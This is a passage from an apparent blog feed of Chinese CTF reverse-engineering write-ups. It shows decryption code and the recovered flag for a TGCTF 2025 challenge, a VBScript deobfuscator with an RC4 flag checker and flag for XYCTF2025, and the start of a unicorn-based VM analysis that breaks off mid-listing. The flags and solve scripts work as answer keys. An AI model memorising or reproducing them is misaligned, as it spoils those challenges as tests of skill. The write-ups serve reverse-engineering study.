class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>,</span><br><span class="line">    <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>,</span><br><span class="line">    <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>,</span><br><span class="line">    <span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span>&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 0x10ea0处数据</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box_ori[] = &#123;</span><br><span class="line">    <span class="number">0xd6</span>, <span class="number">0x90</span>, <span class="number">0xe9</span>, <span class="number">0xfe</span>, <span class="number">0xcc</span>, <span class="number">0xe1</span>, <span class="number">0x3d</span>, <span class="number">0xb7</span>, <span class="number">0x16</span>, <span class="number">0xb6</span>, <span class="number">0x14</span>, <span class="number">0xc2</span>, <span class="number">0x28</span>, <span class="number">0xfb</span>, <span class="number">0x2c</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x2b</span>, <span class="number">0x67</span>, <span class="number">0x9a</span>, <span class="number">0x76</span>, <span class="number">0x2a</span>, <span class="number">0xbe</span>, <span class="number">0x04</span>, <span class="number">0xc3</span>, <span class="number">0xaa</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x9c</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xf4</span>, <span class="number">0x91</span>, <span class="number">0xef</span>, <span class="number">0x98</span>, <span class="number">0x7a</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0b</span>, <span class="number">0x43</span>, <span class="number">0xed</span>, <span class="number">0xcf</span>, <span class="number">0xac</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0xe4</span>, <span class="number">0xb3</span>, <span class="number">0x1c</span>, <span class="number">0xa9</span>, <span class="number">0xc9</span>, <span class="number">0x08</span>, <span class="number">0xe8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xdf</span>, <span class="number">0x94</span>, <span class="number">0xfa</span>, <span class="number">0x75</span>, <span class="number">0x8f</span>, <span class="number">0x3f</span>, <span class="number">0xa6</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xa7</span>, <span class="number">0xfc</span>, <span class="number">0xf3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xba</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3c</span>, <span class="number">0x19</span>, <span class="number">0xe6</span>, <span class="number">0x85</span>, <span class="number">0x4f</span>, <span class="number">0xa8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6b</span>, <span class="number">0x81</span>, <span class="number">0xb2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xda</span>, <span class="number">0x8b</span>, <span class="number">0xf8</span>, <span class="number">0xeb</span>, <span class="number">0x0f</span>, <span class="number">0x4b</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9d</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x1e</span>, <span class="number">0x24</span>, <span class="number">0x0e</span>, <span class="number">0x5e</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xd1</span>, <span class="number">0xa2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7c</span>, <span class="number">0x3b</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0xd4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9f</span>, <span class="number">0xd3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4c</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xe7</span>, <span class="number">0xa0</span>, <span class="number">0xc4</span>, <span class="number">0xc8</span>, <span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xea</span>, <span class="number">0xbf</span>, <span class="number">0x8a</span>, <span class="number">0xd2</span>, <span class="number">0x40</span>, <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xb5</span>, <span class="number">0xa3</span>, <span class="number">0xf7</span>, <span class="number">0xf2</span>, <span class="number">0xce</span>, <span class="number">0xf9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0xe0</span>, <span class="number">0xae</span>, <span class="number">0x5d</span>, <span class="number">0xa4</span>, <span class="number">0x9b</span>, <span class="number">0x34</span>, <span class="number">0x1a</span>, <span class="number">0x55</span>, <span class="number">0xad</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xf5</span>, <span class="number">0x8c</span>, <span class="number">0xb1</span>, <span class="number">0xe3</span>,</span><br><span class="line">    <span class="number">0x1d</span>, <span class="number">0xf6</span>, <span class="number">0xe2</span>, <span class="number">0x2e</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xca</span>, <span class="number">0x60</span>, <span class="number">0xc0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xab</span>, <span class="number">0x0d</span>, <span class="number">0x53</span>, <span class="number">0x4e</span>, <span class="number">0x6f</span>,</span><br><span class="line">    <span class="number">0xd5</span>, <span class="number">0xdb</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xde</span>, <span class="number">0xfd</span>, <span class="number">0x8e</span>, <span class="number">0x2f</span>, <span class="number">0x03</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x72</span>, <span class="number">0x6d</span>, <span class="number">0x6c</span>, <span class="number">0x5b</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x8d</span>, <span class="number">0x1b</span>, <span class="number">0xaf</span>, <span class="number">0x92</span>, <span class="number">0xbb</span>, <span class="number">0xdd</span>, <span class="number">0xbc</span>, <span class="number">0x7f</span>, <span class="number">0x11</span>, <span class="number">0xd9</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>, <span class="number">0x1f</span>, <span class="number">0x10</span>, <span class="number">0x5a</span>, <span class="number">0xd8</span>,</span><br><span class="line">    <span class="number">0x0a</span>, <span class="number">0xc1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xa5</span>, <span class="number">0xcd</span>, <span class="number">0x7b</span>, <span class="number">0xbd</span>, <span class="number">0x2d</span>, <span class="number">0x74</span>, <span class="number">0xd0</span>, <span class="number">0x12</span>, <span class="number">0xb8</span>, <span class="number">0xe5</span>, <span class="number">0xb4</span>, <span class="number">0xb0</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4a</span>, <span class="number">0x0c</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7e</span>, <span class="number">0x65</span>, <span class="number">0xb9</span>, <span class="number">0xf1</span>, <span class="number">0x09</span>, <span class="number">0xc5</span>, <span class="number">0x6e</span>, <span class="number">0xc6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xf0</span>, <span class="number">0x7d</span>, <span class="number">0xec</span>, <span class="number">0x3a</span>, <span class="number">0xdc</span>, <span class="number">0x4d</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xee</span>, <span class="number">0x5f</span>, <span class="number">0x3e</span>, <span class="number">0xd7</span>, <span class="number">0xcb</span>, <span class="number">0x39</span>, <span class="number">0x48</span>&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unnamed_function_10</span><span class="params">(byte *_param1_, <span class="type">int</span> _param2_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i = i + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _param1_[i] = _param1_[i] ^ (byte)_param2_;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Enc[] = &#123;</span><br><span class="line">    <span class="number">0x84</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x1c</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf7</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x49</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xd6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x7b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x46</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xa9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xa3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xe2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x0b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xb0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xdc</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dec_2</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *_Input_, <span class="type">unsigned</span> <span class="type">char</span> *_Key_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> iVar1 = (<span class="type">int</span>)_Key_[c] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    DWORD uVar2 = (<span class="type">int</span>)_Key_[c] &amp; <span class="number">0xf</span>;</span><br><span class="line">    c++;</span><br><span class="line">    <span class="built_in">unnamed_function_10</span>(box_ori, (<span class="type">int</span>)*(<span class="type">char</span> *)(iVar1 * <span class="number">0x10</span> + (<span class="type">unsigned</span> <span class="type">char</span> *)box + uVar2));</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key_o[] = <span class="string">&quot;TGCTF404&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        _Input_[i] = _Input_[i] ^ box_ori2[iVar1 * <span class="number">0x10</span> + i * <span class="number">0x11</span> + uVar2];</span><br><span class="line">        _Input_[i] = _Input_[i] ^ key_o[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *_Input_, <span class="type">int</span> _length_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Key[] = <span class="string">&quot;TGCTF404&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        Key[i] ^= <span class="number">0x51</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; _length_; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">Dec_2</span>((<span class="type">unsigned</span> <span class="type">char</span> *)(_Input_ + i), Key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x194</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> swaps[<span class="number">32</span>][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> Value = <span class="built_in">rand</span>();</span><br><span class="line">        Value = i + Value / (<span class="number">0x7fff</span> / (<span class="number">32</span> - i) + <span class="number">1</span>);</span><br><span class="line">        swaps[i][<span class="number">0</span>] = i;</span><br><span class="line">        swaps[i][<span class="number">1</span>] = Value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> temp = _Input_[swaps[i][<span class="number">0</span>]];</span><br><span class="line">        _Input_[swaps[i][<span class="number">0</span>]] = _Input_[swaps[i][<span class="number">1</span>]];</span><br><span class="line">        _Input_[swaps[i][<span class="number">1</span>]] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Key[] = <span class="string">&quot;TGCTF404&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Enc_flag[<span class="number">32</span>]&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        Enc_flag[i] = *(<span class="type">int</span> *)((byte *)Enc + i * <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">decrypt</span>(Enc_flag, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, Enc_flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HZNUCTF{f898-de85-46e-9e43-b9c8}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TGCTF-2025-逆向WP&quot;&gt;&lt;a href=&quot;#TGCTF-2025-逆向WP&quot; class=&quot;headerlink&quot; title=&quot;TGCTF 2025 逆向WP&quot;&gt;&lt;/a&gt;TGCTF 2025 逆向WP&lt;/h1&gt;&lt;p&gt;战队名：不知道&lt;/p&gt;
&lt;p&gt;排名：</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>XYCTF2025</title>
    <link href="https://tkazer.github.io/2025/04/07/XYCTF2025/"/>
    <id>https://tkazer.github.io/2025/04/07/XYCTF2025/</id>
    <published>2025-04-07T10:30:03.000Z</published>
    <updated>2025-04-22T10:39:58.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XYCTF2025-逆向WP"><a href="#XYCTF2025-逆向WP" class="headerlink" title="XYCTF2025 逆向WP"></a>XYCTF2025 逆向WP</h1><p>虽然这次失去Web手，但是配合新来的师傅，小队的队员们也一起努力打了不错的成绩。</p><p>墨水师傅的MDriver题也是拼尽全力无法战胜（，总体逆向题的质量挺不错的，没什么烂活，值得一试。</p><h2 id="WARMUP"><a href="#WARMUP" class="headerlink" title="WARMUP"></a>WARMUP</h2><p>网上抄的VBS解密代码</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> Defuscator(vbs)</span><br><span class="line">    <span class="keyword">Dim</span> t</span><br><span class="line">    t = InStr(<span class="number">1</span>, vbs, <span class="string">&quot;Execute&quot;</span>, <span class="number">1</span>)</span><br><span class="line">    t = <span class="keyword">Mid</span>(vbs, t + Len(<span class="string">&quot;Execute&quot;</span>))</span><br><span class="line">    t = Eval(t)</span><br><span class="line">    Defuscator = t</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Dim</span> fso, i, outFile</span><br><span class="line"><span class="keyword">Const</span> ForReading = <span class="number">1</span>, ForWriting = <span class="number">2</span></span><br><span class="line"><span class="keyword">Set</span> fso = CreateObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27; 创建或打开一个文件用于写入输出</span></span><br><span class="line">    <span class="keyword">Set</span> outFile = fso.OpenTextFile(<span class="string">&quot;output.txt&quot;</span>, ForWriting, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> WScript.Arguments.Count - <span class="number">1</span></span><br><span class="line">        <span class="keyword">Dim</span> FileName</span><br><span class="line">        FileName = WScript.Arguments(i)</span><br><span class="line">        <span class="keyword">Dim</span> MyFile</span><br><span class="line">        <span class="keyword">Set</span> MyFile = fso.OpenTextFile(FileName, ForReading)</span><br><span class="line">            <span class="keyword">Dim</span> vbs</span><br><span class="line">            vbs = MyFile.ReadAll</span><br><span class="line">            outFile.WriteLine Defuscator(vbs)</span><br><span class="line">            MyFile.Close</span><br><span class="line">        <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">        outFile.Close</span><br><span class="line">        <span class="keyword">Set</span> fso = <span class="literal">Nothing</span></span><br></pre></td></tr></table></figure><p>output.txt:</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">MsgBox <span class="string">&quot;Dear CTFER. Have fun in XYCTF 2025!&quot;</span></span><br><span class="line">flag = InputBox(<span class="string">&quot;Enter the FLAG:&quot;</span>, <span class="string">&quot;XYCTF&quot;</span>)</span><br><span class="line">wefbuwiue = <span class="string">&quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot;</span> <span class="comment">&#x27; 棰勮鐨凴C4鍔犲瘑缁撴灉锛堝崄鍏繘鍒舵牸寮忥級</span></span><br><span class="line">qwfe = <span class="string">&quot;rc4key&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; 淇鍚庣殑RC4鍔犲瘑鍑芥暟</span></span><br><span class="line"><span class="keyword">Function</span> RunRC(sMessage, strKey)</span><br><span class="line">    <span class="keyword">Dim</span> kLen, i, j, temp, pos, outHex</span><br><span class="line">    <span class="keyword">Dim</span> s(<span class="number">255</span>), k(<span class="number">255</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 鍒濆鍖栧瘑閽?</span></span><br><span class="line">    kLen = Len(strKey)</span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        s(i) = i</span><br><span class="line">        k(i) = Asc(<span class="keyword">Mid</span>(strKey, (i <span class="built_in">Mod</span> kLen) + <span class="number">1</span>, <span class="number">1</span>)) <span class="comment">&#x27; 瀵嗛挜浣跨敤ASCII缂栫爜</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; KSA瀵嗛挜璋冨害</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        j = (j + s(i) + k(i)) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; PRGA鍔犲瘑娴佺▼</span></span><br><span class="line">    i = <span class="number">0</span> : j = <span class="number">0</span> : outHex = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">For</span> pos = <span class="number">1</span> <span class="keyword">To</span> Len(sMessage)</span><br><span class="line">        i = (i + <span class="number">1</span>) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        j = (j + s(i)) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line">        </span><br><span class="line">        <span class="comment">&#x27; 鍔犲瘑骞惰浆涓哄崄鍏繘鍒?</span></span><br><span class="line">        <span class="keyword">Dim</span> plainChar, cipherByte</span><br><span class="line">        plainChar = Asc(<span class="keyword">Mid</span>(sMessage, pos, <span class="number">1</span>)) <span class="comment">&#x27; 鏄庢枃鎸堿SCII澶勭悊</span></span><br><span class="line">        cipherByte = s((s(i) + s(j)) <span class="built_in">Mod</span> <span class="number">256</span>) <span class="built_in">Xor</span> plainChar</span><br><span class="line">        outHex = outHex &amp; Right(<span class="string">&quot;0&quot;</span> &amp; Hex(cipherByte), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    </span><br><span class="line">    RunRC = outHex</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; 涓婚獙璇侀€昏緫</span></span><br><span class="line"><span class="keyword">If</span> LCase(RunRC(flag, qwfe)) = LCase(wefbuwiue) <span class="keyword">Then</span></span><br><span class="line">    MsgBox <span class="string">&quot;Congratulations! Correct FLAG!&quot;</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    MsgBox <span class="string">&quot;Wrong flag.&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>RC4解密，密钥为<strong>rc4key</strong></p><p><img src="/2025/04/07/XYCTF2025/1.png"></p><p>flag{We1c0me_t0_XYCTF_2025_reverse_ch@lleng3_by_th3_w@y_p3cd0wn‘s_chall_is_r3@lly_gr3@t_&amp;_fuN!}</p><h2 id="ezVM"><a href="#ezVM" class="headerlink" title="ezVM"></a>ezVM</h2><p>通过字符串界面里的unicorn和加密函数的一些特征发现是使用了unicorn框架调用了一串代码。</p><p>找一个使用unicorn框架的程序进行bindiff恢复一些unicorn函数的符号。</p><p>发现是调用了一串ARM64的代码字节进行模拟执行，将输入字符串传入加密返回，并附上了一些data和栈空间初始化。</p><p><img src="/2025/04/07/XYCTF2025/2.png"></p><p><img src="/2025/04/07/XYCTF2025/4.png"></p><p>将以上调用write写入的数据提取，随便找一个ARM64框架的.so复制到对应地址，以便反编译看代码。</p><p>最后得到一个函数，很清晰的看出里面是一个VM虚拟机执行的流程。</p><p><img src="/2025/04/07/XYCTF2025/5.png"></p><p>使用c++编写代码调用unicorn库进行模拟。</p><p>使用Hook，在关键计算地址处进行Hook，输出各个计算流程以及数据。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 